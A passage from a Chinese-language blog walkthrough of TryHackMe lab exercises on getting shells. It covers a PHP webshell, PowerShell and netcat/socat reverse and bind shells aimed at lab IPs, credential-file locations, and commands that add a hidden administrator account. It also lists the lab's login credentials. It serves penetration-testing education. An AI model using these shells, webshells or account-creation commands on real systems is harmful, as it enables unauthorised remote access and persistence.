<p>我们需要设置三个选项：payload、LHOST 和 LPORT。 这些都与我们在使用 Msfvenom 生成 shellcode 时设置的选项相同——特定于我们的目标的payload，以及我们可以接收 shell 的监听IP地址和端口。</p>
<p>请注意，在此处必须指定 LHOST，因为 metasploit 不会像 netcat 或 socat 那样监听所有网络接口； 所以你必须告诉它一个特定的地址以便进行监听（使用 TryHackMe 时，这将是你的 tun0 地址）。 我们使用以下命令设置这些选项：</p>
<ul>
<li><code>set PAYLOAD &lt;payload&gt;</code></li>
<li><code>set LHOST &lt;listen-address&gt;</code></li>
<li><code>set LPORT &lt;listen-port&gt;</code></li>
</ul>
<p>我们现在应该已经准备好开始监听了！</p>
<p>让我们通过使用" exploit -j "命令，这将告诉 Metasploit 启动模块并将其作为作业（job）在后台运行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324162030799.png" alt="image-20240324162030799"></p>
<p>你可能注意到在上面的截图中，Metasploit 正在监听一个1024以下的端口。为此，Metasploit 必须使用 sudo 权限运行。</p>
<p>当在前面的msfvenom中生成的分段payload开始运行时，Metasploit 将接收连接，并会发送剩余的payload然后给我们提供一个反向 shell:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324162139519.png" alt="image-20240324162139519"></p>
<p>请注意，因为在上面的案例中multi/handler 开始是在后台处理的，所以我们需要使用 " sessions 1 “命令再次将其置于前台。 这很有效，因为它是唯一运行的会话。 如果还有其他活动的会话，我们将需要使用” sessions "命令来查看所有活动的会话，然后使用<code>sessions &lt;number&gt;</code>命令来选择适当的会话置于前台。 这个数字也将显示在打开 shell 的行中（你能看到“<em>Command Shell session <strong>1</strong> opened</em> ”）。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324162240125.png" alt="image-20240324162240125"></p>
<h1 id="0x11-webshell介绍">0x11 webshell介绍</h1>
<p>有时我们会遇到允许我们以某种方式上传可执行文件的网站。 理想情况下，我们会利用这个机会上传可以激活反向shell或绑定 shell 的代码，但有时这是不可能的。 所以在非理想情况下，我们将改为上传 webshell。（请参阅我之前写的关于上传漏洞的博客文章，以更广泛地了解此概念）</p>
<p>“Webshell”是一个通俗的术语，用于指代在网络服务器（通常使用 PHP 或 ASP 等语言）中运行的脚本，该脚本能在服务器上执行代码。本质上，命令被输入到网页中——通过 HTML 表单，或者直接作为 URL 中的参数——然后由脚本执行，执行的结果返回并会写入网站页面。在另一方面，webshell也能够作为进入完全成熟的反向shell或绑定shell的垫脚石。</p>
<p>由于 PHP 仍然是最常见的服务器端脚本语言，让我们来看一些简单的PHP代码，以一种非常基础的单行格式书写:</p>
<pre><code class="hljs scss">&lt;?php echo "&lt;pre&gt;" . <span class="hljs-built_in">shell_exec</span>($_GET["cmd"]) . "&lt;/pre&gt;"; ?&gt;</code></pre>
<p>这将在 URL 中获取一个 GET 参数，并使用" shell_exec() "在系统上执行它。</p>
<p>这意味着我们在URL 中的 " ?cmd= "之后输入的任何命令都将在系统上执行——无论是 Windows 还是 Linux。 " pre "元素是为了确保显示在网站页面上的结果的格式正确。</p>
<p>让我们看看实际情况:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324162539238.png" alt="image-20240324162539238"></p>
<p>请注意，当导航到shell.php页面时，我们在url中使用了带有" ifconfig “命令的 GET 参数” cmd "，然后正确地返回了目标的网络信息。</p>
<p>换句话说，通过在我们上传的shell.php页面的 URL 中输入 ifconfig 命令（该命令用于检查 Linux 目标上的网络接口），使得命令在系统上执行，并将结果返回给我们。 这适用于任何其他命令（例如 whoami、hostname、arch 等）。</p>
<p>如前所述，在 Kali 上默认有多种 webshell 可用，位于/usr/share/webshells路径下——包括臭名昭著的 PentestMonkey php-reverse-shell——一个用 PHP 编写的完整的反向 shell。</p>
<p>请注意，大多数通用的、特定语言的（例如 PHP）反向 shell 是为基于 Unix 的目标（例如 Linux 网络服务器）编写的，它们可能无法在 Windows 上运行。</p>
<blockquote>
<p>PentestMonkey反向shell 链接： <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php</a></p>
</blockquote>
<p>当目标是 Windows 时，通常使用 web shell 获取 RCE，或者使用 msfvenom 生成对应服务器语言的反向/绑定 shell。 前一种方法，通常是使用 URL 编码的 Powershell Reverse Shell 来获取 RCE。 这将作为前面提到的webshell中的cmd 参数复制到 URL 中：</p>
<pre><code class="hljs scss">powershell%<span class="hljs-number">20</span>-c%<span class="hljs-number">20%</span><span class="hljs-number">22%</span><span class="hljs-number">24</span>client%<span class="hljs-number">20%</span><span class="hljs-number">3</span>D%<span class="hljs-number">20</span>New-<span class="hljs-selector-tag">Object</span>%<span class="hljs-number">20S</span>ystem<span class="hljs-selector-class">.Net</span><span class="hljs-selector-class">.Sockets</span><span class="hljs-selector-class">.TCPClient</span>%<span class="hljs-number">28%</span><span class="hljs-number">27</span>&lt;IP&gt;%<span class="hljs-number">27%</span><span class="hljs-number">2</span>C&lt;PORT&gt;%<span class="hljs-number">29%</span><span class="hljs-number">3</span>B%<span class="hljs-number">24s</span>tream%<span class="hljs-number">20%</span><span class="hljs-number">3</span>D%<span class="hljs-number">20%</span><span class="hljs-number">24</span>client<span class="hljs-selector-class">.GetStream</span>%<span class="hljs-number">28%</span><span class="hljs-number">29%</span><span class="hljs-number">3</span>B%<span class="hljs-number">5</span>Bbyte%<span class="hljs-number">5</span>B%<span class="hljs-number">5</span>D%<span class="hljs-number">5</span>D%<span class="hljs-number">24</span>bytes%<span class="hljs-number">20%</span><span class="hljs-number">3</span>D%<span class="hljs-number">200</span>.<span class="hljs-selector-class">.65535</span>%<span class="hljs-number">7</span>C%<span class="hljs-number">25%</span><span class="hljs-number">7</span>B0%<span class="hljs-number">7</span>D%<span class="hljs-number">3</span>Bwhile%<span class="hljs-number">28%</span><span class="hljs-number">28%</span><span class="hljs-number">24</span>i%<span class="hljs-number">20%</span><span class="hljs-number">3</span>D%<span class="hljs-number">20%</span><span class="hljs-number">24s</span>tream<span class="hljs-selector-class">.Read</span>%<span class="hljs-number">28%</span><span class="hljs-number">24</span>bytes%<span class="hljs-number">2</span>C%<span class="hljs-number">200%</span><span class="hljs-number">2</span>C%<span class="hljs-number">20%</span><span class="hljs-number">24</span>bytes<span class="hljs-selector-class">.Length</span>%<span class="hljs-number">29%</span><span class="hljs-number">29%</span><span class="hljs-number">20</span>-ne%<span class="hljs-number">200%</span><span class="hljs-number">29%</span><span class="hljs-number">7</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>data%<span class="hljs-number">20%</span><span class="hljs-number">3</span>D%<span class="hljs-number">20%</span><span class="hljs-number">28</span>New-<span class="hljs-selector-tag">Object</span>%<span class="hljs-number">20</span>-TypeName%<span class="hljs-number">20S</span>ystem<span class="hljs-selector-class">.Text</span><span class="hljs-selector-class">.ASCIIEncoding</span>%<span class="hljs-number">29</span><span class="hljs-selector-class">.GetString</span>%<span class="hljs-number">28%</span><span class="hljs-number">24</span>bytes%<span class="hljs-number">2</span>C0%<span class="hljs-number">2</span>C%<span class="hljs-number">20%</span><span class="hljs-number">24</span>i%<span class="hljs-number">29%</span><span class="hljs-number">3</span>B%<span class="hljs-number">24s</span>endback%<span class="hljs-number">20%</span><span class="hljs-number">3</span>D%<span class="hljs-number">20%</span><span class="hljs-number">28</span>iex%<span class="hljs-number">20%</span><span class="hljs-number">24</span>data%<span class="hljs-number">202%</span><span class="hljs-number">3</span>E%<span class="hljs-number">261%</span><span class="hljs-number">20%</span><span class="hljs-number">7</span>C%<span class="hljs-number">20</span>Out-String%<span class="hljs-number">20%</span><span class="hljs-number">29%</span><span class="hljs-number">3</span>B%<span class="hljs-number">24s</span>endback2%<span class="hljs-number">20%</span><span class="hljs-number">3</span>D%<span class="hljs-number">20%</span><span class="hljs-number">24s</span>endback%<span class="hljs-number">20%</span><span class="hljs-number">2</span>B%<span class="hljs-number">20%</span><span class="hljs-number">27</span>PS%<span class="hljs-number">20%</span><span class="hljs-number">27%</span><span class="hljs-number">20%</span><span class="hljs-number">2</span>B%<span class="hljs-number">20%</span><span class="hljs-number">28</span>pwd%<span class="hljs-number">29</span><span class="hljs-selector-class">.Path</span>%<span class="hljs-number">20%</span><span class="hljs-number">2</span>B%<span class="hljs-number">20%</span><span class="hljs-number">27%</span><span class="hljs-number">3</span>E%<span class="hljs-number">20%</span><span class="hljs-number">27%</span><span class="hljs-number">3</span>B%<span class="hljs-number">24s</span>endbyte%<span class="hljs-number">20%</span><span class="hljs-number">3</span>D%<span class="hljs-number">20%</span><span class="hljs-number">28%</span><span class="hljs-number">5</span>Btext<span class="hljs-selector-class">.encoding</span>%<span class="hljs-number">5</span>D%<span class="hljs-number">3</span>A%<span class="hljs-number">3</span>AASCII%<span class="hljs-number">29</span><span class="hljs-selector-class">.GetBytes</span>%<span class="hljs-number">28%</span><span class="hljs-number">24s</span>endback2%<span class="hljs-number">29%</span><span class="hljs-number">3</span>B%<span class="hljs-number">24s</span>tream<span class="hljs-selector-class">.Write</span>%<span class="hljs-number">28%</span><span class="hljs-number">24s</span>endbyte%<span class="hljs-number">2</span>C0%<span class="hljs-number">2</span>C%<span class="hljs-number">24s</span>endbyte<span class="hljs-selector-class">.Length</span>%<span class="hljs-number">29%</span><span class="hljs-number">3</span>B%<span class="hljs-number">24s</span>tream<span class="hljs-selector-class">.Flush</span>%<span class="hljs-number">28%</span><span class="hljs-number">29%</span><span class="hljs-number">7</span>D%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>client<span class="hljs-selector-class">.Close</span>%<span class="hljs-number">28%</span><span class="hljs-number">29%</span><span class="hljs-number">22</span></code></pre>
<p>这与我们在第8小节中遇到的powershell shell 相同，但是，它经过了 URL 编码，可以在 GET 参数中安全使用。 请记住，IP 和端口（以上内容中的IP、PORT）仍然需要在上面的代码中进行更改。</p>
<h1 id="0x12-获取shell之后的操作">0x12 获取shell之后的操作</h1>
<p>好了，我们有shell了，现在怎么办？</p>
<p>我们已经介绍了许多生成、发送和接收 shell 的方法，这些方法都有一个共同点，那就是得到的shell往往是不稳定的和非交互的。 即使是更容易稳定化的 Unix 风格的shell的稳定性也不是非常理想。 那么，我们能做些什么呢？</p>
<p>理想情况下，在 Linux 上，我们会接着寻找机会访问用户帐户，存储在<code>/home/&lt;user&gt;/.ssh</code>的 SSH 密钥通常是执行此操作的理想方式。</p>
<p>在 CTF 中，在目标机的某处发现密码凭证也不少见，一些漏洞exp还允许你添加自己的帐户，特别是像 Dirty C0w（脏牛漏洞） 或可写的 /etc/shadow 文件或 /etc/passwd文件会很快让你通过 SSH 来访问目标机器，假设目标机器的SSH服务是打开的。</p>
<blockquote>
<p>Dirty C0w（脏牛漏洞）介绍：<a target="_blank" rel="noopener" href="https://dirtycow.ninja/">https://dirtycow.ninja/</a></p>
</blockquote>
<p>而在 Windows 上，可利用的选项通常更加有限，有时可以在注册表中找到运行服务的密码。例如，VNC 服务器经常将密码以明文形式存储在注册表中，某些版本的 FileZilla FTP 服务器还会在 XML 文件中保留登录凭据，可能保留凭据的文件路径是：</p>
<pre><code class="hljs scss">C:\Program Files\FileZilla Server\FileZilla Server.xml 
#或者
C:\xampp\FileZilla Server\FileZilla Server.xml

#这些凭据可以是MD5散列值，也可以是明文，具体取决于版本</code></pre>
<p>理想情况下，在 Windows 上，你将获得以 SYSTEM 用户身份运行的 shell，或以高权限运行的管理员帐户。 在这种情况下，你可以简单地将你自己的帐户（在管理员组中）添加到计算机，然后通过 RDP、telnet、winexe、psexec、WinRM 或其他方法登录，具体情况取决于目标机器上运行的服务。</p>
<p>其基本语法如下:</p>
<pre><code class="hljs scss">net user &lt;username&gt; &lt;password&gt; /add            #添加新用户
net localgroup administrators &lt;username&gt; /add  #添加用户到管理员组</code></pre>
<p>反向 shell 和绑定 shell 是在机器上获得远程代码执行的基本技术，但是，它们永远不会像原生 shell 那样功能齐全。 理想情况下，我们总是希望升级为使用“正常”方法来访问机器，因为这总是更容易用于进一步利用目标。</p>
<h1 id="0x13-练习与实践">0x13 练习与实践</h1>
<p>这个章节包含了大量的信息，并且几乎没有机会让你始终将其付诸实践。</p>
<p>接下来的实践与案例将包含两个虚拟机（一个 Ubuntu 18.04 服务器和一个 Windows 服务器），每个都配置有一个简单的网络服务器，请使用它上传和激活 shell。</p>
<p>在这个案例中提供的是一个沙盒环境，所以没有过滤器需要进行绕过，你可以选择登录以使用 netcat、socat 或meterpreter shell 进行练习，提供登录凭据和说明，同时还会给出一些shell示例。</p>
<h2 id="linux-practice-box">Linux Practice Box</h2>
<p>附加到此任务的盒子是一个 Ubuntu 服务器，其文件上传页面在网络服务器上运行。这应该用于在 Linux 系统上练习 shell 上传。同样，本机上也安装了 socat 和 netcat，因此请随意通过端口 22 上的 SSH 登录来直接使用它们进行练习。登录的凭据是：</p>
<ul>
<li>用户名：shell</li>
<li>密码：TryH4ckM3!</li>
</ul>
<h3 id="练习1">练习1</h3>
<p>准备一个webshell</p>
<pre><code class="hljs scss">&lt;?php echo "&lt;pre&gt;" . <span class="hljs-built_in">shell_exec</span>($_GET["cmd"]) . "&lt;/pre&gt;"; ?&gt;</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324164350846.png" alt="image-20240324164350846"></p>
<p>接着在webshell页面连接攻击机监听端</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324164815702.png" alt="image-20240324164815702"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324164832964.png" alt="image-20240324164832964"></p>
<h3 id="练习2">练习2</h3>
<p>进入shell文件目录，修改对应IP与端口</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324165101678.png" alt="image-20240324165101678"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324165248044.png" alt="image-20240324165248044"></p>
<p>成功拿shell</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324165307528.png" alt="image-20240324165307528"></p>
<h3 id="练习3">练习3</h3>
<p>ssh登录目标机</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324165413527.png" alt="image-20240324165413527"></p>
<p>在目标机使用netcat建立监听端，并在攻击机使用nc连接目标端口即可拿到绑定shell</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324165612429.png" alt="image-20240324165612429"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324165911242.png" alt="image-20240324165911242"></p>
<p>第二种方法，适用于linux系统</p>
<pre><code class="hljs scss">mkfifo /tmp/f; nc -lvnp <span class="hljs-number">5555</span> &lt; /tmp/f | /bin/sh &gt;/tmp/f <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>; rm /tmp/f</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324170020857.png" alt="image-20240324170020857"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324170035621.png" alt="image-20240324170035621"></p>
<p>也是成功拿到shell，接下来尝试练习反向shell</p>
<pre><code class="hljs scss">mkfifo /tmp/f; nc <span class="hljs-number">10.10</span><span class="hljs-selector-class">.197</span><span class="hljs-selector-class">.61</span> <span class="hljs-number">5555</span> &lt; /tmp/f | /bin/sh &gt;/tmp/f <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>; rm /tmp/f<span class="hljs-comment">//目标机上执行</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324170258431.png" alt="image-20240324170258431"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324170311947.png" alt="image-20240324170311947"></p>
<h3 id="练习4">练习4</h3>
<pre><code class="hljs scss">socat TCP-L:<span class="hljs-number">5555</span> //kali上执行
socat TCP:<span class="hljs-number">10.11</span>.<span class="hljs-number">65.203</span>:<span class="hljs-number">5555</span> EXEC:<span class="hljs-string">"bash -li"</span> //目标机执行</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324170831602.png" alt="image-20240324170831602"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324170850376.png" alt="image-20240324170850376"></p>
<p>可以看到回显会出现在两个机器上，下面是绑定shell</p>
<pre><code class="hljs scss">socat TCP-L:<span class="hljs-number">5555</span> EXEC:<span class="hljs-string">"bash -li"</span> //目标机执行
socat TCP:<span class="hljs-number">10.10</span>.<span class="hljs-number">197.61</span>:<span class="hljs-number">5555</span> -  //kali执行</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324171219376.png" alt="image-20240324171219376"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324171226107.png" alt="image-20240324171226107"></p>
<p>接下来尝试建立一个完美的交互式shell</p>
<pre><code class="hljs scss">socat TCP:<span class="hljs-number">10.11</span>.<span class="hljs-number">65.203</span>:<span class="hljs-number">5555</span> EXEC:<span class="hljs-string">"bash -li"</span>,pty,stderr,sigint,setsid,sane //目标机执行
socat TCP-L:<span class="hljs-number">5555</span> FILE:`tty`,raw,echo=<span class="hljs-number">0</span>  //kali执行</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324171455324.png" alt="image-20240324171455324"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324171507775.png" alt="image-20240324171507775"></p>
<p>接下来尝试socat的加密shell</p>
<pre><code class="hljs scss">openssl req <span class="hljs-attr">--newkey</span> rsa:<span class="hljs-number">2048</span> -nodes -keyout shell.key -x509 -days <span class="hljs-number">362</span> -out shell.crt
cat shell.key shell.crt &gt; shell.pem
socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=<span class="hljs-number">0</span> -
//以上是kali执行，下面是目标机执行
socat OPENSSL:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt;,verify=<span class="hljs-number">0</span> EXEC:/bin/bash</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324171817435.png" alt="image-20240324171817435"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324171832766.png" alt="image-20240324171832766"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324171958465.png" alt="image-20240324171958465"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324172003728.png" alt="image-20240324172003728"></p>
<pre><code class="hljs scss">socat OPENSSL-LISTEN:<span class="hljs-number">5555</span>,cert=shell.pem,verify=<span class="hljs-number">0</span> EXEC:/bin/bash //目标机执行
socat OPENSSL:<span class="hljs-number">10.10</span>.<span class="hljs-number">197.61</span>:<span class="hljs-number">5555</span>,verify=<span class="hljs-number">0</span> - //kali执行</code></pre>
<p>首先开始个http服务，上传对应shell.pem到目标机</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324172342525.png" alt="image-20240324172342525"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324172401802.png" alt="image-20240324172401802"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324172452503.png" alt="image-20240324172452503"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324172446164.png" alt="image-20240324172446164"></p>
<h3 id="练习5">练习5</h3>
<p>这里尝试直接上传php_reverse_shell，但是无效</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324173034082.png" alt="image-20240324173034082"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324173108405.png" alt="image-20240324173108405"></p>
<p>这说明该php_reverse_shell内容只适用于unix系统</p>
<h3 id="练习6">练习6</h3>
<p>尝试上传webshell，利用shell_exec执行powershell反弹shell脚本</p>
<pre><code class="hljs scss">&lt;?php echo "&lt;pre&gt;" . <span class="hljs-built_in">shell_exec</span>($_GET["cmd"]) . "&lt;/pre&gt;"; ?&gt;</code></pre>
<pre><code class="hljs scss">powershell -c "<span class="hljs-variable">$client</span> = New-<span class="hljs-selector-tag">Object</span> System<span class="hljs-selector-class">.Net</span><span class="hljs-selector-class">.Sockets</span><span class="hljs-selector-class">.TCPClient</span>('<span class="hljs-number">10.11</span>.<span class="hljs-number">65.203</span>',<span class="hljs-number">5555</span>);<span class="hljs-variable">$stream</span> = <span class="hljs-variable">$client</span><span class="hljs-selector-class">.GetStream</span>();<span class="hljs-selector-attr">[byte[]</span>]<span class="hljs-variable">$bytes</span> = <span class="hljs-number">0</span>.<span class="hljs-selector-class">.65535</span>|%{<span class="hljs-number">0</span>};<span class="hljs-built_in">while</span>(($i = $stream.Read($bytes, <span class="hljs-number">0</span>, $bytes.Length)) -ne <span class="hljs-number">0</span>){;<span class="hljs-variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding)<span class="hljs-selector-class">.GetString</span>($bytes,<span class="hljs-number">0</span>, $i);<span class="hljs-variable">$sendback</span> = (iex $data <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | Out-String );<span class="hljs-variable">$sendback2</span> = <span class="hljs-variable">$sendback</span> + 'PS ' + (pwd)<span class="hljs-selector-class">.Path</span> + '&gt; ';<span class="hljs-variable">$sendbyte</span> = ([text.encoding]::ASCII)<span class="hljs-selector-class">.GetBytes</span>($sendback2);<span class="hljs-variable">$stream</span><span class="hljs-selector-class">.Write</span>($sendbyte,<span class="hljs-number">0</span>,$sendbyte.Length);<span class="hljs-variable">$stream</span><span class="hljs-selector-class">.Flush</span>()};<span class="hljs-variable">$client</span><span class="hljs-selector-class">.Close</span>()"</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324173833707.png" alt="image-20240324173833707"></p>
<h3 id="练习7">练习7</h3>
<p>可以在上面练习6的基础上，添加用户到管理员组，直接远程登录</p>
<pre><code class="hljs scss">net user &lt;username&gt; &lt;password&gt; /add            #添加新用户
net localgroup administrators &lt;username&gt; /add  #添加用户到管理员组</code></pre>
